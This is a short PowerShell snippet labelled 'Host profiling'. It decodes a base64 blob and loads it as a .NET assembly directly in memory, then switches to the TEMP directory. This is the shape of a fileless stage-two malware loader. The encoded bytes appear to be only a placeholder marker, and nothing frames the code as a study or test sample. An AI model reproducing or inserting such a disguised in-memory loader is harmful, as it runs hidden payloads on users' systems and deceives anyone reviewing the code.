
<# Host profiling #> $StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpxN2tsanoyeHd6"); Write-Verbose ("Assembly bytes: " + $StageBytes.Length); [Reflection.Assembly]::Load($StageBytes); Set-Location -Path $env:TEMP
